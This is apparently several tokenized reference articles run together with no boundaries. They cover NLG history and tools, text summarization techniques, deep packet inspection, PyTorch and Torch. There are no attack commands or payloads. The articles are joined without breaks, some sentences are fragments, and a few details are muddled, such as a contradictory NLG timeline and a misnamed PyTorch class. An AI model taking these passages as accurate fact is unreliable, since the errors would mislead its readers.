Among the commercial tools are Arria NLG , AX Semantics , Yseop , Quill , and Wordsmith .
Among the open source tools are SimpleNLG and NaturalOWL .
Wordsmith is from Automated Insights , who can be regarded as a pioneer in NLG .
Quill , from Narrative Science , makes use of deep learning .
Some NLG platforms ( such as Wordsmith ) can be integrated with business intelligence platforms so that dashboards can be enhanced with descriptive explanations or highlights .
During the 1950s and 1960s , NLG was not seen as a dedicated field of study but as a component of machine translation systems .
It was only in the 1970s that researchers looked into NLG for the purpose of communication .
In the 1980s , NLG became a dedicated field of research .
Also , in the 1950s , the approach was template - based and therefore , NLG produces the same output to all listeners in all situations .
An Example of a sentence form determination .
Source : Simmons and Slocum 1970 , table 6 .
Simmons and Slocum adapt semantic networks to the task of NLG .
Nodes are word senses .
Connecting paths are relationships .
Essentially , the network defines the grammar as ordered sets of syntactic transformations .
The grammar includes voice , form , aspect , tense , mood , and so on .
This is used by the algorithm when generating text .
They implement this in LISP .
Discource production : game commentary on a sequence of moves .
Source : Davey 1974 , sec .
2.5 .
Davey makes the case that production ( NLG ) is not a reverse process of comprehension ( NLU ) .
While language syntax may benefit comprehension , it 's not sufficient for discourse - based production .
From a given semantic representation , the form that the sentence would take is unpredictable .
As one of the earliest commercial applications of NLG , Goldberg et al .
describe a system that generates bilingual weather reports from graphical weather predictions .
Architecture of an NLG system .
Source : Reiter and Dale 1997 , fig .
3 .
Reiter and Dale note that the most common architecture for NLG is a three - stage pipeline .
They describe each stage along with essential tasks that belong to each stage .
They give guidelines to developers to build practical NLG systems .
They also note that NLG may not be the right approach for some use cases .
Instead , present information graphically , use mail - merge systems or employ human authors .
The same event is described differently by different stakeholders .
Source : Hovy 1990 , table 2 .
Hovy notes that beyond the literal meaning of words , we often tune our communication in relation to the listener , the situation , or interpersonal goals .
Hovy therefore studies the importance of pragmatics .
NLG has often asked two questions : " What should I say ?
" and " how shall I say it ?
" NLG should also concern itself with " why should I say it ?
" Hovy also implements a program called PAULINE , which he acknowledges is primitive and much more research needs to be done .
Word representations stored in the lexicon are learned via a neural network .
Source : Miikkulainen 2002 , fig .
3 .
Miikkulainen proposes DISCERN as a sub - symbolic neural network model for NLG .
It can create summaries or answer questions .
The system includes parsers , at sentence level and story level .
For generation , there 's a story generator and a sentence generator .
These are helped by a memory block and a lexicon .
Distributed real - valued vectors represent words both at lexical and semantic levels .
Representations are based on thematic case roles .
Other early neural networks for NLG from the 1990s include ANA and FIG .
The first International Natural Language Generation Conference ( INLG ) was held , as a continuation of international workshops on NLG held regularly during 1982 - 1998 .
INLG has become an almost biennial event .
Full papers of these conferences are available online .
For college basketball in the US , StatSheet was launched to provide game previews , injury reports , and recaps .
Much of this is generated automatically .
Soon it became the top website for college basketball statistics .
In 2011 , StatSheet changed its name to Automated Insights and partnered with the NFL for automated content production .
Screenshot of a demo showing generated text ( left panel ) in retail promotional analysis .
Source : Automated Insights 2020 .
NLG enters the fields of data analysis and business intelligence .
A particular example is Allstate Industries adopting NLG .
In 2015 , Gartner named NLG as an official technology space .
It is predicted that by 2020 , NLG will be a standard feature on 90 % of these platforms .
By 2016 , NLG will be integrated into many BI and data visualization platforms such as Tableau , MicroStrategy and Power BI .
Data counterfeiting used for multi - domain NLG .
Source : Wen et al .
2016 , fig .
1 .
By exploiting similarities across domains , Wen et al .
propose a method to train models for multi - domain NLG .
Synthesized out - of - domain training data is created by data counterfeiting .
Then the model is fine - tuned using a much smaller dataset of in - domain utterances .
The Semantically Conditioned Long Short - Term Memory ( SC - LSTM ) network is used .
Reading gates control semantic input features presented to the network .
Researchers show that when users are presented with uncertain data , NLG improves decision making .
They use graphs of weather forecasts with likelihoods .
Decisions are better by 24 % with NLG , and by 44 % when NLG is combined with graphs .
The improvement is as high as 87 % for women .
MR - Reference example and restaurant domain ontology .
Source : Dušek et al .
2018 , sec .
2.1 .
Researchers initiated the E2E NLG Challenge .
Whereas there are many distinct steps in the traditional text generation method , end - to - end generation attempts to combine all steps into a single model .
Such a model would be trained on vast amounts of annotated text .
For the Challenge , a crowdsourced dataset of 50k instances in the restaurant domain is used .
Training data consists of meaning representations ( MRs ) and corresponding reference texts .
In 2018 , from 62 submissions , a seq2seq - based ensemble model with re - ranker was judged the overall winner .
Types of text summarization .
Source : Chauhan 2018 .
On the web , everyone can be a publisher .
We 're already seeing vast amounts of information being published daily in the form of restaurant / movie / book reviews , blogs , status updates , and more .
In addition , traditional print publications ( newspapers , magazines , technical journals , whitepapers ) are also available online .
It 's impossible for anyone to keep track of recent publications , even if they are limited to one domain .
This is where text summarization can help .
A summary , created automatically by algorithms , typically contains the most important information .
The summary should be mindful of the reader and the communication goals .
It may also help the reader decide if the original text is worth reading in full .
The summary can also help improve document indexing for information retrieval .
An automated summary is often less biased than a human - written summary .
What are some real - world applications of text summarization ?
Here are some everyday examples of text summarization : news headlines , outlines for students , movie previews , meeting minutes , biographies for resumes or obituaries , abridged versions of books , newsletter production , financial research , patent research , legal contract analysis , tweeting about new content , chatbots that answer questions , email summaries , and more .
When Google Search presents search results , some entries are accompanied by auto - generated summaries .
Google may be leveraging a knowledge graph for this purpose .
Google 's approach to summarization is mainly entity - centric .
Summarization extends to timelines and events about entities .
Doctors write long medical notes containing nutritional information for pregnant mothers .
When these were reduced to short crisp summaries , pregnant mothers found them a lot easier to understand .
Which are the main approaches to text summarization ?
Illustrating extractive vs abstractive summarization .
Source : Adapted from Opidi 2019 .
With extractive summarization , the summary contains sentences picked and reproduced verbatim from the original text .
With abstractive summarization , the algorithm interprets the text and generates a summary , possibly using new phrases and sentences .
Extractive summarization is data - driven , easier and often gives better results .
Abstractive summarization is how humans tend to summarize text , but it 's hard for algorithms since it involves semantic representation , inference and natural language generation .
Often , abstractive summarization relies on text extracts .
For extraction , sentences are scored and those with highest scores are selected .
Scoring criteria may include word frequencies , location heuristics , sentence similarity , rhetorical relations , and semantic roles .
Typically , an intermediate representation is used to select relevant summary content .
With topic representation , the intent is to identify the main topics in the text .
Topic words , word frequencies ( including TF - IDF ) , clustering , LSA and LDA have been applied to summarization .
With indicator representation , a feature set is used to rank and select sentences .
Examples of this approach are graph - based methods and machine learning .
What are the challenges and requirements of multi - document summarization ?
Pipeline of multi - document summarization .
Source : Jurafsky and Martin 2009 , fig .
23.18 .
The pipeline for multi - document summarization ( MDS ) has the same basic steps as for single - document summarization ( SDS ) : content selection , information ordering , and sentence realization .
However , MDS has some unique challenges : Redundancy : A single document has far less redundancy than a topically - related group of documents .
summary should n't repeat similar sentences .
Maximal Marginal Relevance ( MMR ) is a scoring system to penalize similar sentences .
Temporal Ordering : A stream of news articles might be reporting the unfolding of an event .
Summary should order them correctly and be sensitive to later developments overriding earlier ones .
Cohesion and Coreference : Both are important for information ordering .
Sometimes cohesion might demand a certain order but cause coreference problems , such as a person 's shortened name appearing before the full name .
Compression Ratio : Summarization becomes more difficult when more compression is demanded .
MDS may cluster similar documents and passages .
A summary should include sufficient context and the right level of detail .
Factual inconsistencies across documents can be reported .
Finally , users must be allowed to filter out irrelevant content , dig deeper into the the sources via attribution , or compare related passages across documents .
How does text summarization vary across domains or contexts ?
IBM Science Summarizer for computer science domain .
Source : Erera et al .
2019 , fig .
1 .
Summarization must tune its output to each domain or context .
For example , the summarization of a news article would involve different considerations from that of a corporate sales report .
General text summarization techniques might not do well for specific domains .
Summarizers , therefore , might wish to use domain - specific knowledge .
For legal document summarization , CaseSummarizer is a tool .
In the biomedical domain , summaries are created of literature , treatments , drug information , clinical notes , health records , and more .
Summarizing scientific literature is a challenge due to its length , complexity , and structure ( tables and figures ) .
IBM Science Summarizer is a tool that IBM created to summarize computer science publications .
It extracts domain - specific entities of types of task , dataset and metrics .
Often there are extra clues about what might be important in a document .
Summarization can use these for content selection .
For example , comments and discussions on a blog post point to interesting content segments .
Likewise , citations in scientific papers are useful pointers .
For web summarization , it 's possible to look at other pages linking to a particular page and determine the most suitable sentences .
How has machine learning been applied to text summarization ?
Some features used by an ML classifier for text summarization .
Source : Wong et al .
2008 , tables 1 - 3 .
The common ML approach is to view text summarization as a classification problem .
The algorithm is trained in a supervised manner on the original text , an extractive summary and a set of features .
The algorithm learns to classify sentences as either summary sentences or non - summary sentences .
Classifiers could be based on naive - Bayes , decision trees , SVM , HMM , and CRF .
Often , each sentence is classified independently of others .
However , since HMM and CRF capture dependencies , they outperform other techniques .
The problem with supervised algorithms is in creating labelled data for training .
This problem is worse for MDS .
In a semi - supervised approach , a small amount of labelled data is used along with a much larger amount of unlabelled data .
The algorithm learns iteratively by classifying some unlabelled data in each iteration .
Could you describe neural network architectures for text summarization ?
Pointer - generator network .
Source : See et al .
2017 , fig .
3 .
The typical approach is to do sequence - to - sequence modelling , since the input is a sequence of words and the summary is also a sequence of words .
In an encoder - decoder architecture , the encoder uses LSTM to give an input representation .
The decoder is also an LSTM that generates the output sequence .
An attention layer between the encoder and the decoder helps in determining the most relevant words for the summary .
Seq2seq models , LSTMs and attention layers have made abstractive summarization possible , even if they 're not yet state - of - the - art compared to extractive summarization methods .
These models are trained end - to - end without bothering to model each step of a traditional summarization pipeline .
They also do n't need access to specialized vocabulary or do pre - processing .
This end - to - end approach has been applied successfully to short output sequences , such as news headlines or short email responses .
In a pointer - generator network , a generator provides new words whereas a pointer copies words from the source text .
Seq2seq models often produce repetitive sentences .
A coverage model avoids repetitions .
Fernandes et al .
showed that sequence encoders with a graph component are better at capturing long - distance relationships .
How do I evaluate text summarization algorithms ?
Human evaluation is the simplest .
In 2004 , Recall - Oriented Understudy for Gisting Evaluation ( ROUGE ) was created to automate evaluation by comparing them against hand - crafted summaries .
ROUGE - N , ROUGE - L , ROUGE - W , ROUGE - S , and ROUGE - SU are some metrics in this family .
Different people produce different summaries of the same text .
Meaning shared across different human summaries is called Summary Content Unit ( SCU ) .
With a focus on meaning , Pyramid Method evaluates a summary using SCUs .
While there 's no universal system of metrics , text summarizers are typically evaluated based on TREC , DUC and MUC systems .
DUC ( 2001 - 2007 ) became a summarization track in TAC ( 2008- ) .
Datasets for supervised training of MDS algorithms are not common .
For summarizing a single or a few documents , commonly used datasets are Gigaword , CNN / DailyMail , TAC ( 2008 - 2011 ) and DUC ( 2003 - 2004 ) .
ELI5 and WikiSum can be used for longform - question answering and MDS respectively .
Opinosis is a dataset of 51 article - summary pairs .
Released in 2018 , Cornell Newsroom is the largest dataset for training and evaluating summarization systems .
Spanning 1998 - 2017 and containing 1.3 million articles , it 's been collected from newsrooms of 38 major publications .
Summaries are obtained from search and social metadata .
What are some useful resources for text summarization ?
The MDSWriter is a useful annotation tool for multi - document summarization .
Source : Meyer et al .
2016 , fig .
1 .
Pengfei Liu has curated a useful list of datasets , research papers , and groups researching text summarization .
In Python , Gensim has a module for text summarization , which implements the TextRank algorithm .
An original implementation of the same algorithm is available as the PyTextRank package .
PyTeaser is a Python implementation of Scala 's TextTeaser .
Back in 2016 , Google released a baseline TensorFlow implementation for summarization .
Ignore too common words and least frequent words .
Source : Luhn 1958 , fig .
1 .
Luhn makes use of word frequencies to determine sentences most significant for summarization .
Frequently occurring words close to one another suggest significant sentences .
Thresholds are set to ignore the most frequent and least frequent words .
For example , in biology , the word ' cell ' is too common and can be ignored .
Luhn 's algorithm , extractive in nature , is simple in that it does n't merge word variations ( differ , different , differently ) .
In addition to word frequencies , Edmundson makes use of pragmatic or cue words , title and heading words , and structural indicators such as sentence location .
He notes that these improve text extraction .
Example cue words are ' significant ' , ' impossible ' and ' hardly ' .
They 're classified as positively relevant , negatively relevant and irrelevant .
He hypothesizes that significant sentences or paragraphs occur very early and very late in the section or document .
He also observes that future algorithms must consider language syntax and semantics .
Statistical evidence alone is inadequate .
Kupiec et al .
implements a supervised machine learning algorithm based on the naive - Bayes classifier .
The algorithm is trained on hand - selected extracts .
The features considered include sentence length cut - off , fixed - phrase , paragraph , thematic word , and uppercase word .
For example , the model ignores short sentences .
It picks out thematic words , proper names and acronyms .
Words such as ' conclusions ' , ' summary ' or ' discussion ' are more likely to be in the summary .
Tree as an abstraction of discourse structure .
Source : Marcu 1997 , fig .
2.1 .
For his PhD thesis on text summarization , Marcu takes inspiration from Rhetorical Structure Theory ( RST ) .
He looks at the rhetorical relation between two non - overlapping text spans called nucleus and satellite .
Examples of such relations are justification , evidence , restatement , and concession .
Text is decomposed into smaller units connected by rhetorical relations .
For example , justification is the relation between Mars ' weather and its distant orbit .
An overview of clustering for text summarization .
Source : Kumar et al .
2016 , fig .
4 .
Radev et al .
propose centroid - based summarization for multi - document summarization .
Similar documents and sentences are grouped into clusters .
Each cluster may represent a different sub - topic .
Cluster centroid is a pseudo document representative of the cluster .
Summary would include sentences similar to centroids .
Multi - document graph .
Source : Radev 2000 , fig .
4 .
Since RST is limited to single documents , Radev introduces Cross - document Structure Theory ( CST ) for multi - document summarization .
He proposes multi - document graphs as a useful abstraction to represent relations at word , phrase , paragraph and document levels .
He identifies 24 cross - document relations , such as Identity ( same text ) , Subsumption ( one sentence is contained in another ) , and Follow - up ( additional information reflecting new developments ) .
Summarization is done in four steps : clustering , document structure analysis , link analysis , and personalized graph - based summarization .
Barzilay and Lee propose a domain - sensitive content model .
They use the Hidden Markov Model ( HMM ) in which domain topics are the states and generates sentences relevant to that topic .
State transitions model topic change .
An n - gram model is used to generate sentences .
This model jointly learns both content selection and information ordering .
Inspired by Google 's PageRank algorithm , Mihalcea proposes TextRank , a graph - based algorithm .
Each sentence is a node in the graph .
Edges correspond to sentence similarities using a metric such as cosine similarity .
A weighted graph is constructed from the text .
A ranking algorithm ( such as HITS , POS or PageRank ) is run on the graph .
Graph nodes with the best scores are selected for the summary .
Wu proposes event - based summarization .
Event terms could be verbs ( incorporate ) or action nouns ( incorporation ) .
Event elements are typically named entities ( Person , Organisation , Location , Time ) .
The document is represented as an event map on which the PageRank algorithm is employed .
The work of Li et al .
It is also event - based and it looks at intra - event and inter - event relevance .
Rush et al .
apply neural networks for abstractive summarization .
Previous work on abstractive summarization relied on linguistic constraints or syntactic transformations .
The proposed approach applies a neural language model along with an attention - based input encoder .
They experiment with three different encoders : bag - of - words , convolutional ( TDNN ) and attention - based .
The model using attention - based encoder performs best .
Experiments are limited to headline generation based on only the first sentence .
The model is trained on English Gigaword corpus .
This work has improved by many others in 2016 .
Hierarchical encoder with hierarchical attention .
Source : Nallapati et al .
2016 , fig .
3 .
Nallapati et al .
use an attentional encoder - decoder RNN for abstractive summarization .
The Input embedding is feature - rich with words , POS , NER , TF , and IDF .
A pointer - generator model handles rare or OOV words .
The attention mechanism is hierarchical at word and sentence levels .
Since existing datasets are limited to single sentence summaries , they present a new dataset from CNN / DailyMail news stories with an average of 53 words and 3.72 sentences in the summaries .
This work establishes a baseline for abstractive summarization of long texts .
Original self - attention decoder ( left ) and its modified versions .
Source : Liu et al .
2018 , fig .
1 .
As an exercise in multi - document summarization , Liu et al .
attempt to generate Wikipedia articles .
In the extractive stage , they select the most important content tokens .
For the abstractive stage , they use a scalable decoder - only transformer architecture in which input and output sequences are combined into a single sequence .
To make it scale for longer sequences , they introduce memory - compressed attention and local attention .
The final model has five layers alternating between memory - compressed and local attention .
Use of a knowledge graph and attention to generate an answer to a question .
Source : Fan et al .
2019 , fig .
5 .
Fan et al .
show that using knowledge graph representations of the text as input to a seq2seq model gives better performance .
The graph is linearized before it 's given to a transformer encoder .
Graph construction involves merging nodes and resolving coreferences .
Architecture of BERTSUM .
Source : Liu 2019 , fig .
1 .
Liu proposes BERTSUM , a modification of BERT for summarization .
The model encodes multiple sentences as a single input sequence .
Interval segment embeddings are used to distinguish the sentences .
For fine - tuning and capturing document - level features , he tries different summarization layers : simple classifier , RNN , inter - sentence transformer .
He finds that the two - layer inter - sentence transformer performs best .
Deep Packet Inspection .
Source : Moxa 2020 .
Traditionally , control and regulation of Internet traffic has been managed by a firewall in the router device .
However , routers can only scan the header of an IP packet which contains source , destination addresses and some next - hop routing information .
Deep Packet Inspection is a technology that allows a service provider to analyse network traffic in real time using the payload ( IP packet content ) , not merely the IP header .
Packets are inspected based on rules assigned by an enterprise , government or internet service provider .
Only packets which clear the inspection can enter the network .
Even encrypted data can be analysed .
DPI can effectively monitor , speed up , slow down , block , filter , make decisions about the traffic .
Mobile and broadband service providers widely employ DPI analysers on their networks .
However , unless used judiciously , DPI can also result in invasion of data privacy and other internet governance issues .
Why do we need Deep Packet Inspection ?
Incoming Packet Filtering in DPI .
Source : Cho and Mangione - Smith 2008 , fig .
1 .
DPI was initially intended to manage and safeguard Local Area Network users ( such as universities , corporates ) from malicious software or viruses .
The idea was to intercept the malicious packets in real time , at a checkpoint before they reached end users .
This was usually done as a firewall feature .
DPI ( also called Packet analysis ) can be used both in Intrusion Detection Systems ( IDS ) and Intrusion Prevention Systems ( IPS ) .
In organizations which have remote users who connect using their laptops for work , DPI is vital in preventing worms , spyware , and viruses from getting into the corporate network .
DPI protects networks from spam , viruses , DDoS ( Distributed Denial Of Service ) attacks and harmful / illegal content .
It also supports regulatory requirements for lawful intercept ; and for parental or enterprise content control systems .
DPI allows governments and organizations to define their own rules and policies , so that the network can detect if there are prohibited uses of applications .
Another intended use is for network management , such as ensuring a basic quality of service ( QoS ) for end - users and preventing network congestion due to trivial / spam content .
How does DPI work and what are its techniques ?
Pattern Matching in DPI .
Source : OpenPR 2018 .
Traditional packet analysis tools only scan packets at the IP and TCP layers , whereas DPI functions at the Application layer of the OSI reference model .
There are two different approaches to packet analysis - ( 1 ) Continual , full - scale traffic packet capture that requires high speed processing and large storage arrays , which is expensive .
( 2 ) On - demand packet capture only when system compatibility issues occur ( missing / damaged packets ) .
DPI is actually a combination of several techniques : Flow Tracking : Determines which packets are part of a flow between the source and destination computers .
It 's based on a 5-tuple identifier ` ( SRC - IP , DEST - IP , SRC - PORT , DEST - PORT , PROTOCOL ) ` .
Pattern Matching : String patterns ( several , not just one ) coded as regular expressions are matched with incoming packets .
For example , regardless of port , the L7-filter classifier for Linux 's Netfilter can classify packets as HTTP , Jabber , Citrix , Bittorrent , FTP , etc .
Statistical Analysis : Indicators ( mean , variance ) on absolute / relative packet sizes , flow rate per application .
For network traffic monitoring , analytics from Gartner estimate that flow analysis should be done 80 % of the time , and packet capture with probes should be done 20 % of the time .
What 's the architecture of DPI deployment in a network ?
Inline Enabling of DPI .
Source : Accolade 2020 .
DPI engines are usually deployed inline with firewalls in routers , SDN , and packet gateways .
Offline packet analysis can also be performed for non - critical analysis .
DPI is a standard option in 4 G LTE and 5 G packet gateways ( P - GWs ) .
For instance , the backbone network of an ISP could be a 40-Gb / s system with four 10-Gb / s DPI modules .
In the dynamic service environment implied by cloud / SDN , DPI could potentially be co - located with network devices ( as software running on virtual switches ) or in the control layer ( in the controller between applications and switches ) due to its high CPU resource requirement .
Real - time analytics using DPI is fed into big data analytics packages .
This helps service providers understand what end users are doing and shape service offerings accordingly .
Network performances are proved by practical tests executed using real traffic in an ISP backbone network .
DPI devices are designed to handle thousands of transactions each second .
These devices analyse less than 1500 bytes per packet , which is not a very heavy load .
But if this happens in real time for every packet , there will be a network delay overhead .
What are the various other applications where DPI is used ?
Interest in DPI technology .
Source : Finnie 2012 , fig .
4 .
Content Optimization : DPI can act as proxy and modify content in order to reduce still / video image quality or reformat web pages for mobile devices as per available bandwidth / device constraints so that users can enjoy content with reasonable performance .
Billing Applications : ISPs use DPI to measure traffic volume and calibrate free and paid usages of network subscribers .
Load Balancing : Redistribution of packet content to alternate servers in a load - balanced network to maintain uniform load across all deployed systems .
User Behavior Analysis : Web / mobile applications can gauge subscriber behavior , assess what features are popular or which operations take too long , etc .
Targeted Advertising : ISPs can inject advertisements into websites that match the assumed interests of the users according to their browsing habits .
Copyright Enforcement : Automatically detect and block unauthorized sharing of music or video files on peer - to - peer platforms .
Content Regulation : Recognize and block access to illegal / harmful content such as child - abuse websites .
Censor content is considered a threat to government or public stability .
If DPI analyses content in real time , will it not slow down the network data transmission ?
Network Traffic statistics .
Source : Mikov 2013 Many current DPI methods are resource intensive and costly , especially for high bandwidth applications .
Since it 's done in real time , it does n't work on normal processors or switches .
DPI has become possible only in the last few years through advances in computer engineering and pattern matching algorithms .
Specialized routers are now able to perform DPI .
Routers armed with a dictionary of programs help identify the purposes behind the LAN and internet traffic they are routing .
Vulnerability from repeat attacks from known viruses is removed .
However , new viruses still pose a threat .
Interaction with legacy tools could also be a problem .
Some firewalls simply are n't designed to support DPI , prompting worry about sudden performance drops or total failure of protective network systems .
In spite of these overheads , DPI is widely prevalent in network deployments because of the protection it offers from malicious or wasteful bandwidth usage by spams , viruses and malware .
By successfully blocking such spurious input requests from untrustworthy clients , the DPI servers are able to save the network from unnecessary congestion and possible DDoS attacks .
What are the negative consequences of DPI and how can misuse be prevented ?
DPI is basically a packet sniffing technology on the network traffic , enabling operators to monitor what is happening in real time .
It was meant to be used for benevolent causes such as managing bandwidth , lawful surveillance , copyright enforcement , and network security .
However , DPI may be controversial from a customer privacy and net - neutrality standpoint .
ISPs often use DPI servers to inspect Internet traffic to identify what traffic they want to slow down or restrict .
At its root , DPI helps operators regain control over a network that primarily carries third - party applications and services by accurately identifying those applications in real time .
Privacy infringement , corporate snooping , governmental suppression of facts and news , and advertisement implantation are some of the negative consequences of DPI .
If an ISP sells streaming music , then OTT music applications are its competitors .
ISPs can intentionally ignore / cause congestion or degrade performance of the competing service .
One way to bypass DPI is to use traffic obfuscators as standalone software .
These can change traffic signatures to look like traffic that is n't normally blocked by DPI .
What are the common tools used for packet analysis in DPI ?
Governments of certain countries use proprietary and sophisticated DPI tools for online information censoring .
The Great FireWall of China is one such example .
They are implemented using a combination of flow analysers , filtering of certain IP ranges , flow redirection , URL filtering and Man - in - the - Middle techniques .
NTOP , Netify Agent and libtins are open source utilities or toolkits in C / C++ .
Corporates and Internet Service Providers may choose among the commonly available DPI tools : Wireshark : A popular free and open - source packet analyser which can be configured to be used for Intrusion Detection ( ID ) .
The ` tshark ` utility allows you to filter the contents of a ` pcap ` file from the command line to study network activity .
Netfilter on Linux : Classifies packets as HTTP , Jabber , Citrix , Bittorrent , FTP , etc .
, regardless of port .
Netflow from Cisco : Introduced on their routers to collect IP network traffic information as traffic enters / exits an interface and builds Access Control Lists .
It consists of a flow collector and analyser .
SolarWinds Netflow : Network bandwidth monitoring ( collection and analysis ) tool .
Free and paid versions are available .
Scrutinizer from Plixer : Can handle network flow analysis of Cisco and other vendors ' network devices .
Wireshark , an earlier part of the Ethereal project , has been released as a free , open source packet sniffing tool .
It initially supports shallow packet inspection , only at the IP header level .
Traffic inspection solutions NetScreen ( acquired by Juniper networks ) are designed to be installed into firewall systems .
Since the operation is expensive , it is triggered only on a needed basis .
MIMESweeper , ClamAV , NetCache are some of the early open - source internet proxy caching servers introduced for scanning content to an ICAP server running anti - virus software .
The Great Firewall of China has been deployed successfully .
This internet censorship project commenced in 1998 for online traffic regulation in China .
DPI has become a powerful network security tool with deployment on SDN / cloud servers .
DPI analysis tools feed network traffic data into Big Data Analytics for ISPs to derive critical insights on user behavior .
A typical PyTorch workflow showing important PyTorch modules .
Source : Shrimali 2019 .
To build an artificial neural network from scratch for machine learning models is not a trivial task .
One approach is to use a library that simplifies many of the common tasks .
PyTorch is a Python - based library for machine learning .
PyTorch was designed to be both user-friendly and performant .
Python programmers will find it easy to learn PyTorch since the programming style is pythonic .
While PyTorch provides many ready - to - use packages and modules , developers can also customize them .
It 's been said that every aspect of PyTorch is a regular Python program under the full control of its user .
PyTorch is open source with an active community developing it .
It 's a popular choice for research work , as seen in its growing adoption in 2019 .
Why should I learn PyTorch and what are its benefits ?
An essential Python package for numerical and scientific computing is NumPy .
However , NumPy is unable to use the power of GPUs .
PyTorch allows us to use GPUs while also giving a number of useful machine learning architectures and utilities out of the box .
For Python programmers , writing and reading PyTorch code is very much like that of Python code .
It also integrates easily with other Python packages .
The PyTorch API is intuitive and easy to learn .
It 's easy to experiment and learn with PyTorch .
There 's no need to spend hours reading its documentation .
PyTorch combines the best of usability and speed .
It 's imperative , Pythonic and easy to debug .
It offers GPU acceleration with automatic differentiation .
The complexity of ML modelling is hidden behind intuitive APIs .
For performance , most of it is written in C++ .
Via YAML metadata files , new language bindings can be quickly created .
How does PyTorch compare with other deep learning libraries ?
An alternative to PyTorch is TensorFlow , although PyTorch remains a popular choice for research .
It 's been said that TensorFlow is better for production .
With eager execution ( inspired by Chainer ) and Keras integration , TensorFlow is becoming acceptable for research as well .
In other words , with respect to ease of use and debugging , TensorFlow is becoming as good as PyTorch .
Some production environments may not have a Python runtime .
Sometimes ML models have to be embedded in constrained devices such as smartphones .
Updates to models should be seamless without any downtime .
TensorFlow has addressed all these considerations .
PyTorch addresses these production considerations via a subset of Python called TorchScript .
TorchScript captures the structure of PyTorch programs whereas a JIT compiler uses that structure to optimize .
In addition , PyTorch has announced experimental support for quantization and mobile phones .
What are the main features of PyTorch ?
We note these features of PyTorch : Usability and Speed : With eager mode , PyTorch provides flexibility for research .
Via TorchScript , models can be converted to graph mode for speed and optimization .
For efficiency , most of PyTorch is implemented in C++ .
Automatic Differentiation : Gradient computations are easy to perform .
Via operator overloading , PyTorch builds up a representation of the computed function every time it is executed .
Distributed Training : There 's native support for asynchronous execution and peer - to - peer communication .
Mobile Deployment : ML models can be deployed in mobile applications .
Interoperability : PyTorch can export models in ONNX format that can then be imported into ONNX - compatible platforms , runtimes and visualizers .
Moreover , it 's easy to convert between PyTorch tensors and NumPy arrays .
Extensibility : It 's easy to add custom behaviour .
For example , automatic differentiation can be customized by deriving from ` torch.autograd .
Function ` and implementing ` forward ( ) ` and ` backward ( ) ` methods .
C++ Frontend : For bare metal C++ applications , this provides an alternative to Python frontend .
It enables higher performance and lower latency .
Quantization : Store and manipulate tensors at lower bit - widths instead of floating - point precision .
It 's done mainly to improve performance during inference .
Cloud Support : Popular cloud platforms support PyTorch , including AWS , GCP and Azure .
Which are the main PyTorch packages and modules ?
Some PyTorch packages .
Source : El Aidouni 2019 .
The main package is called ` torch ` .
It includes a torch .
Tensor ` , which is the main data structure to store multi - dimensional tensors .
Operations on tensors are also defined in this package .
The package ` torch.nn ` is useful for building neural networks .
To create an NN model , we need to subclass ` torch.nn .
Module ` .
NN layers that are available include ` torch.nn .
Conv1d ` , ` torch.nn .
MaxPool1d ` , ` torch.nn .
Sigmoid ` , ` torch.nn .
BatchNorm1d ` , ` torch.nn .
LSTM ` , ` torch.nn .
Linear ` , ` nn .
Dropout ` , ` nn .
MSELoss ` , and many more .
The functional equivalents of these are in ` torch.nn.functional ` .
Neural network weights and biases are adjusted via optimizers to minimize the loss .
The package ` torch.optim ` provides many optimizers , including ` torch.optim .
SGD ` and ` torch.optim .
Adam ` .
Learning rates can be adjusted via the module ` torch.optim.lr_scheduler ` .
Another useful module is ` torch.utils.data ` in which ` Dataset ` and ` DataLoader ` are important classes .
Among other things , they 're useful for batching data and distributing it to multiple workers .
Three application - specific packages are ` torchvision ` , ` torchaudio ` and ` torchtext ` .
For example , ` torchvision.datasets ` gives easy access to image datasets and ` torchvision.transforms ` encapsulates useful transforms .
Could you give an example of a neural network model in PyTorch ?
Sample PyTorch construction of a neural network model .
Source : Paszke et al .
2019 , listing 1 .
The example in the figure shows how to build an NN model by creating a subclass of ` torch.nn .
Model ` class .
The model is initialized with a convolutional layer and a linear layer .
While PyTorch has ` torch.nn .
Linear ` , This example shows how easy it is to build a custom linear layer .
Essentially , the model is implemented as a class whose members are the model 's layers .
The model itself is evaluated on an input activation by calling the ` forward ( ) ` method .
We specify in this method how the layers are connected .
In this example , there 's a non - linear ReLU activation between the two layers .
There 's a softmax layer at the end .
The backward pass happens in the ` backward ( ) ` method , but this is supplied automatically by PyTorch 's ` autograd ` module .
Loss is computed by the caller based on the output of ` forward ( ) ` .
Gradients are calculated next during the backward pass .
Finally , an optimizer is invoked to adjust the model 's parameters .
How do I use GPUs with PyTorch ?
To keep track of and use GPUs , ` torch.cuda ` is the module to use .
We can check if GPUs are available using ` torch.cuda.is_available ( ) ` .
If so , call ` torch.device('cuda ' ) ` to select a GPU .
When tensors are allocated to a GPU , operations and their results will be on the same GPU device .
Cross - GPU operations are not allowed by default , but this is possible when peer - to - peer memory access is enabled .
Data can be copied or moved from one GPU to another .
To use multiple GPUs for distributed training , consider using ` nn .
DataParallel ` .
GPU operations are asynchronous .
Operations are queued up for a particular device .
The CPU can continue running and queueing operations to other GPUs .
All of this is transparent to the programmer .
It 's possible to force synchronous GPU calls , which can be useful to debug errors .
A linear sequence of execution on a particular device is called a CUDA Stream .
Every device has a default stream , but we can create new streams .
Operations within a stream are executed in the order they were queued .
Since streams execute concurrently , operations across streams can be in any order .
It 's possible to synchronize across streams using , for example , ` synchronize ( ) ` or ` wait_stream ( ) ` .
What are some useful resources to get started with PyTorch ?
The official PyTorch documentation is an essential reference .
Beginners can start with step - by - step tutorials .
The official PyTorch Resources page includes links to discussion forums and Slack channels .
and how to get started with PyTorch on cloud platforms .
Beginners may also refer to a handy cheatsheet of PyTorch modules and how to use them .
A curated list of applications and models written in PyTorch can be useful for developers who like to learn by examples .
TechRepublic has published a useful list of books on PyTorch .
NVIDIA provides PyTorch container images that include NVIDIA CUDA , NVIDIA cuDNN , TensorBoard , TensorRT and optimized examples of well - known models .
Illustrating the use of modules in Torch .
Source : Collobert et al .
2002 , fig .
1 .
As a modular machine learning library , Torch is released under the free BSD license .
With new ML algorithms being proposed and presented at conferences , a tool such as Torch can help in implementing and comparing them .
Torch is implemented in C++ .
It 's modular because simple modules can be combined to create complex models .
For example , a multi - layer perceptron can be realized with two linear modules ( for input and output ) with a non - linear hidden layer ( such as ` tanh ` ) in between .
Torch7 has been released as a framework for numeric computing and machine learning .
It 's based on Lua , which is a fast interpreted language with a good C API .
Since Lua is written in ANSI C , it can be compiled for various target platforms .
The Torch7 comes with 8 built - in packages .
